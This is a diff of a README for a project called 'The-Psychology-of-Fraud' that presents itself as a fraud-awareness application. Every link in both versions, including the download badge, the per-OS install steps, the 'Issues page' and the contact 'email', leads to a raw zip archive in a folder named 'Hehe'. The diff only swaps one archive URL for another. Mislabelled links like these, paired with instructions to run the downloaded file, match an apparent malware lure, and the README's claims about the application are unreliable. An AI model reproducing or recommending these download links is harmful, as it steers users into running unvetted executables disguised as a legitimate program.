@@ -6,11 +6,11 @@ Welcome to **The-Psychology-of-Fraud**! This project explores how human psycholo
 
 ## 📥 Download the Application
 
-[![Download Now](https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip%20Now-Click%20Here-blue)](https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip)
+[![Download Now](https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip)
 
 To get started, visit the Releases page to download the application:
 
-[Download the Latest Version](https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -35,12 +35,12 @@ Before you download, ensure your system meets these requirements:
 3. Choose the file that matches your operating system. For example:
    - **Windows:** Download the `.exe` file.
    - **macOS:** Download the `.dmg` file.
-   - **Linux:** Download the appropriate `https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip` file.
+   - **Linux:** Download the appropriate `https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip` file.
 4. Save the file to your computer.
 5. Once downloaded, locate the file and run it:
    - For Windows, double-click on the `.exe` file.
    - For macOS, open the `.dmg` file and drag the application to the Applications folder.
-   - For Linux, extract the `https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip` file and follow the instructions in the README file included in the folder.
+   - For Linux, extract the `https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip` file and follow the instructions in the README file included in the folder.
 
 ## 📖 User Guide
 
@@ -62,7 +62,7 @@ Yes, the application is open-source and free to use for everyone.
 
 ### Where can I report issues or suggest features?
 
-You can report issues or suggest new features by opening an issue on our [GitHub Issues page](https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip).
+You can report issues or suggest new features by opening an issue on our [GitHub Issues page](https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip).
 
 ## 🤝 Contributing
 
@@ -76,10 +76,10 @@ If you would like to contribute to this project, please follow these steps:
 
 ## 📞 Contact
 
-For further inquiries, you can reach the development team via email at https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip We welcome feedback and suggestions!
+For further inquiries, you can reach the development team via email at https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip We welcome feedback and suggestions!
 
 ## 🙌 Acknowledgments
 
 Thank you for exploring **The-Psychology-of-Fraud**. We hope this application aids you in understanding and combating financial crime through a deeper understanding of human behavior.
 
-[Download the Latest Version](https://github.com/afadlah/The-Psychology-of-Fraud/raw/refs/heads/main/Hehe/of-The-Psychology-Fraud-v1.7.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/afadlah/The-Psychology-of-Fraud/main/Hehe/The_of_Psychology_Fraud_2.3.zip)
